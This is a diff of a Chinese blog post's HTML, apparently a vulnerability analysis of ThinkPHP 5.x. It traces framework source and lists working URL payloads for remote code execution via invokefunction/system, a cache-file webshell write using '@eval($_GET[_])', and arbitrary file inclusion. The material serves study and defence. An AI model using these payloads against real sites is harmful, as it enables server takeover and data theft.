-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($name, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = array_merge(<span class="keyword">$this</span>-&gt;data, $name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[$name] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function assign($name, $value = &#39;&#39;)
+{
+    if (is_array($name)) {
+        $this-&gt;data = array_merge($this-&gt;data, $name);
+    } else {
+        $this-&gt;data[$name] = $value;
+    }
+    return $this;
+}</code></pre>
 <p>看到我们传入的数据直接保存到view的<code>$this-&gt;data</code><br>接下来调用<code>fetch</code>.我们同样一路跟到View类的<code>fetch</code>中。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($template = <span class="string">''</span>, $vars = [], $replace = [], $config = [], $renderContent = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 模板变量</span></span><br><span class="line">    $vars = array_merge(<span class="keyword">self</span>::$var, <span class="keyword">$this</span>-&gt;data, $vars);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页面缓存</span></span><br><span class="line">    ob_start();</span><br><span class="line">    ob_implicit_flush(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 渲染输出</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $method = $renderContent ? <span class="string">'display'</span> : <span class="string">'fetch'</span>;</span><br><span class="line">        <span class="comment">// 允许用户自定义模板的字符串替换</span></span><br><span class="line">        $replace = array_merge(<span class="keyword">$this</span>-&gt;replace, $replace, (<span class="keyword">array</span>) <span class="keyword">$this</span>-&gt;engine-&gt;config(<span class="string">'tpl_replace_string'</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;engine-&gt;config(<span class="string">'tpl_replace_string'</span>, $replace);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;engine-&gt;$method($template, $vars, $config);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并清空缓存</span></span><br><span class="line">    $content = ob_get_clean();</span><br><span class="line">    <span class="comment">// 内容过滤标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_filter'</span>, $content);</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false)
+{
+    // 模板变量
+    $vars = array_merge(self::$var, $this-&gt;data, $vars);
 
+    // 页面缓存
+    ob_start();
+    ob_implicit_flush(0);
+
+    // 渲染输出
+    try {
+        $method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;
+        // 允许用户自定义模板的字符串替换
+        $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));
+        $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);
+        $this-&gt;engine-&gt;$method($template, $vars, $config);
+    } catch (\Exception $e) {
+        ob_end_clean();
+        throw $e;
+    }
+
+    // 获取并清空缓存
+    $content = ob_get_clean();
+    // 内容过滤标签
+    Hook::listen(&#39;view_filter&#39;, $content);
+    return $content;
+}</code></pre>
 <p>这里很快会发现实际调用的是<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code>.而<code>$method</code>此处为<code>fetch</code>,<code>$vars</code>为我们可控的传入变量。接下来由模板引擎处理我们的变量</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($template, $data = [], $config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> == pathinfo($template, PATHINFO_EXTENSION)) &#123;</span><br><span class="line">        <span class="comment">// 获取模板文件名</span></span><br><span class="line">        $template = <span class="keyword">$this</span>-&gt;parseTemplate($template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 模板不存在 抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (!is_file($template)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TemplateNotFoundException(<span class="string">'template not exists:'</span> . $template, $template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记录视图信息</span></span><br><span class="line">    App::$debug &amp;&amp; Log::record(<span class="string">'[ VIEW ] '</span> . $template . <span class="string">' [ '</span> . var_export(array_keys($data), <span class="keyword">true</span>) . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template-&gt;fetch($template, $data, $config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function fetch($template, $data = [], $config = [])
+{
+    if (&#39;&#39; == pathinfo($template, PATHINFO_EXTENSION)) {
+        // 获取模板文件名
+        $template = $this-&gt;parseTemplate($template);
+    }
+    // 模板不存在 抛出异常
+    if (!is_file($template)) {
+        throw new TemplateNotFoundException(&#39;template not exists:&#39; . $template, $template);
+    }
+    // 记录视图信息
+    App::$debug &amp;&amp; Log::record(&#39;[ VIEW ] &#39; . $template . &#39; [ &#39; . var_export(array_keys($data), true) . &#39; ]&#39;, &#39;info&#39;);
+    $this-&gt;template-&gt;fetch($template, $data, $config);
+}</code></pre>
 <p>注意到如果<code>$template</code>对应的路径文件不存在的话直接报错了。所以这个lfi洞的前提还得需要我们环境代码中存在<code>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</code>。<br>如果这里没报错即进入template的<code>fetch</code>.<br><img src="/2020/08/05/Thinkphp-vuln/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>看到<code>$vars</code>被赋给data.而马上下面storage调用了read函数。里面存在<code>extract</code>这样的变量覆盖代码。并且直接<code>include</code>cacheFile。</p>
 <p>也就是说,<code>$cacheFile</code>可以被变量覆盖。达成lfi。</p>
 <p>官方的修复方法是通过将<code>$cacheFile</code> 变量存储在 <code>$this-&gt;cacheFile</code> 中.防止变量覆盖。</p>
 <h2 id="tp5-0-rce"><a href="#tp5-0-rce" class="headerlink" title="tp5.0-rce"></a>tp5.0-rce</h2><p>Index.php配置</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">"name"</span>,input(<span class="string">"get.username"</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Cache success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+use think\Cache;
+class Index
+{
+    public function index()
+    {
+        Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));
+        return &#39;Cache success&#39;;
+    }
+}</code></pre>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username&#x3D;byc_404%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-<p>上面的payload将把一句话webshell写入缓存文件。访问对应路径即可。<br><img src="/2020/08/05/Thinkphp-vuln/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>http://localhost/tpdemo/public/?username=byc_404%0d%0a@eval($_GET[_]);// </code></pre><p>上面的payload将把一句话webshell写入缓存文件。访问对应路径即可。<br><img src="/2020/08/05/Thinkphp-vuln/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>这个用例其实跟以前ichunqiu平台上一道thinkphp二次开发的模板缓存文件getshell很相似。这里来跟进下源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$writeTimes++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::init()-&gt;set($name, $value, $expire);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">(array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">self</span>::$handler)) &#123;</span><br><span class="line">        <span class="comment">// 自动初始化缓存</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options)) &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect($options);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'complex'</span> == Config::get(<span class="string">'cache.type'</span>)) &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect(Config::get(<span class="string">'cache.default'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect(Config::get(<span class="string">'cache'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">self</span>::$handler = $connect;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::$handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public static function set($name, $value, $expire = null)
+{
+    self::$writeTimes++;
+    return self::init()-&gt;set($name, $value, $expire);
+}
+......
+
+public static function init(array $options = [])
+{
+    if (is_null(self::$handler)) {
+        // 自动初始化缓存
+        if (!empty($options)) {
+            $connect = self::connect($options);
+        } elseif (&#39;complex&#39; == Config::get(&#39;cache.type&#39;)) {
+            $connect = self::connect(Config::get(&#39;cache.default&#39;));
+        } else {
+            $connect = self::connect(Config::get(&#39;cache&#39;));
+        }
+        self::$handler = $connect;
+    }
+    return self::$handler;
+}</code></pre>
 <p>这里init()函数主要是实例化了一个<code>handler</code>对象。此处为默认值File类。那么前往cache/driver/File类看下.<br>此处File类的set方法如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . $data . <span class="string">"\n?&gt;"</span>;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function set($name, $value, $expire = null)
+{
+    if (is_null($expire)) {
+        $expire = $this-&gt;options[&#39;expire&#39;];
+    }
+    $filename = $this-&gt;getCacheKey($name);
+    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
+        $first = true;
+    }
+    $data = serialize($value);
+    if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
+        //数据压缩
+        $data = gzcompress($data, 3);
+    }
+    $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . $data . &quot;\n?&gt;&quot;;
+    $result = file_put_contents($filename, $data);
+    if ($result) {
+        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+        clearstatcache();
+        return true;
+    } else {
+        return false;
+    }
+}</code></pre>
 <p>可以看到。数据<code>$value</code>经由序列化后被拼接到含有php代码块的语句中。之后执行<code>file_put_contents</code>.符合我们写入shell的用法。<br>因此只需注意使用换行符bypass前面的注释符即可。</p>
 <p>当然这个写shell rce的方法比较尴尬。因为文件名可以看到由<code>getCacheKey</code>决定。其文件名生成方式如下：先计算键名md5值。再取前两位为目录。后30位为文件名。我们这里是因为提前设定好了Index.php中键名为<code>name</code>.所以可以计算文件名<code>b0/68931cc450442b63f5b3d276ea4297.php</code>。但是实际中如果没有源码泄露无法得知键名。也就没法计算shell的路径。</p>
 <p>当然。在反序列化pop链中我们利用这个File类关于文件名可控的问题就大不一样了。具体后面再说。</p>
 <h2 id="tp5-rce-get"><a href="#tp5-rce-get" class="headerlink" title="tp5.*-rce-get"></a>tp5.*-rce-get</h2><p>比较出名的rce洞。影响版本5.0.7&lt;=ThinkPHP5&lt;=5.0.22 、5.1.0&lt;=ThinkPHP&lt;=5.1.30。<br>5.1.x版本的payload有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-
-<p>5.0.*</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
-<p>首先起因可以从config/app.php中看到。默认情况下<code>var_pathinfo</code>为s.<code>url_route_must</code>为false<br><img src="/2020/08/05/Thinkphp-vuln/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><p>5.0.*</p>
+<pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><p>首先起因可以从config/app.php中看到。默认情况下<code>var_pathinfo</code>为s.<code>url_route_must</code>为false<br><img src="/2020/08/05/Thinkphp-vuln/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>显然此时我们可以任意调用控制器。thinkphp中的流程是<code>http://site/?s=模块/控制器/方法</code></p>
 <p>在重要代码controller处下断点（此处也是5.1.30后高版本官方修改的部分。说明原代码存在问题）<br><img src="/2020/08/05/Thinkphp-vuln/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami</span><br></pre></td></tr></table></figure>
-<p>自动跟随debug调用函数跟进。开始在controller这可以看见<code>$result</code>变量是存储了我们传入的值的数组。其值分别为<code>index</code>,<code>\think\Request</code>,<code>input</code>.<br>一路跟下去会发现执行代码的关键位置在<br>thinkphp\library\think\route\dispatch\Module.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
